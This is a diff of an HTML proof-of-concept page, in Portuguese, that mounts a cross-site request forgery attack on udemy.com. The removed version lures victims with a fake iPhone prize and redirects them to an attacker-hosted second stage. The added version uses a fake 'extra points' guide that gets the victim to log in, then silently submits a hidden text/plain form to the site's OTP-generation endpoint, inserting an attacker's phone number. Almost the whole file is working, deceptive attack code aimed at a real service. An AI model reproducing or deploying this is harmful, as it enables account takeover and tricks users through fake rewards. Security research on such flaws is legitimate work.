@@ -1,78 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ganhe um Prêmio Exclusivo!</title>
-    <style>
-        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
-        h1 { color: #e53935; }
-        .btn { background: #e53935; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        .prize-box { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 4px; text-align: center; }
-        .steps { margin-bottom: 20px; }
-    </style>
+    <title>Ataque CSRF - Duas Janelas</title>
 </head>
 <body>
-    <h1>🎉 Parabéns! Você foi selecionado para um prêmio exclusivo!</h1>
+    <h1>Guia para ganhar pontos extras</h1>
+    <p>Siga os passos abaixo para receber pontos exclusivos:</p>
     
-    <div class="prize-box">
-        <h2>iPhone 15 Pro</h2>
-        <p>Restam apenas <strong>2</strong> unidades disponíveis para resgate hoje.</p>
-        <button id="claim-btn" class="btn">RESGATAR AGORA</button>
+    <div id="step1">
+        <h3>Passo 1: Faça login na sua conta</h3>
+        <p>Clique no botão abaixo e faça login na sua conta. <strong>Depois de fazer login, volte para esta página</strong>.</p>
+        <button id="login-button" onclick="openLoginWindow()">Fazer Login</button>
     </div>
     
-    <div id="steps-container" style="display: none;">
-        <h3>Quase lá! Complete estes passos rápidos:</h3>
-        <div class="steps">
-            <p>✅ <strong>Passo 1:</strong> <span id="step1-text">Verificando sua elegibilidade...</span></p>
-            <p id="step2" style="color: #999;">⏳ <strong>Passo 2:</strong> Confirmando seus dados...</p>
-            <p id="step3" style="color: #999;">⏳ <strong>Passo 3:</strong> Registrando seu prêmio...</p>
-        </div>
+    <div id="step2" style="display:none;">
+        <h3>Passo 2: Confirme seus dados para receber os pontos</h3>
+        <p>Agora que você está logado, clique no botão abaixo para confirmar seus dados e receber os pontos:</p>
+        <button id="confirm-button" onclick="executeCsrf()">Confirmar Meus Dados</button>
     </div>
-    
-    <!-- Este iframe será usado para a primeira requisição -->
-    <iframe id="auth-frame" style="display: none;"></iframe>
     
     <script>
-        // Armazena o estado do ataque
-        let attackState = {
-            started: false,
-            getRequestSent: false,
-            getRequestCompleted: false,
-            postRequestSent: false,
-            targetPhone: "+5514996810417"  // Número de telefone a ser inserido
-        };
+        function openLoginWindow() {
+            // Abre o site alvo em uma nova janela/aba
+            window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US', '_blank');
+            
+            // Mostrar o próximo passo
+            document.getElementById('step1').innerHTML = '<h3>✅ Passo 1: Login iniciado</h3><p>Após fazer login, volte para esta página e continue para o próximo passo.</p>';
+            document.getElementById('step2').style.display = 'block';
+        }
         
-        // Gerencia o fluxo de ataque
-        document.getElementById('claim-btn').addEventListener('click', function() {
-            // Esconde o botão e mostra os passos
-            this.disabled = true;
-            this.textContent = "Processando...";
-            document.getElementById('steps-container').style.display = 'block';
+        function executeCsrf() {
+            // Tenta executar o CSRF após o usuário confirmar que já fez login
+            document.getElementById('confirm-button').disabled = true;
+            document.getElementById('confirm-button').textContent = "Processando...";
             
-            // Inicia o ataque - Primeira etapa: requisição top-level GET
-            initiateAttack();
-        });
-        
-        function initiateAttack() {
-            // Marca que o ataque começou
-            attackState.started = true;
+            // Cria e envia o formulário para executar o CSRF
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/';
+            form.enctype = 'text/plain';
             
-            // Atualiza o status do passo 1
-            document.getElementById('step1-text').textContent = "Verificação em andamento...";
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = '{"purpose":3,"phone_number":"';
+            input.value = '+5514996810417"}';
+            form.appendChild(input);
             
-            // Armazena informações no localStorage para persistir entre redirecionamentos
-            localStorage.setItem('csrf_attack_state', JSON.stringify(attackState));
+            // Usa um iframe para não interromper a experiência
+            var iframe = document.createElement('iframe');
+            iframe.name = 'csrf-frame';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
             
-            // Redireciona para o site alvo usando uma navegação top-level GET
-            // Isto enviará os cookies SameSite=Lax
-            setTimeout(() => {
-                document.getElementById('step1-text').textContent = "Redirecionando para verificação...";
-                
-                // PRIMEIRO ESTÁGIO: GET para estabelecer cookies/sessão
-                window.location.href = "https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=" + 
-                    encodeURIComponent("https://alanls1.github.io/test/csrf-stage2.html");
-                
-                // Depois do redirecionamento, a vítima será enviada para csrf-stage2.html
-                // que completará o segundo estágio do ataque
+            form.target = 'csrf-frame';
+            document.body.appendChild(form);
+            form.submit();
+            
+            // Feedback visual
+            setTimeout(function() {
+                document.getElementById('step2').innerHTML = '<h3>✅ Passo 2: Dados confirmados!</h3><p>Seus pontos serão adicionados em breve. Obrigado por participar!</p>';
             }, 1500);
         }
     </script>
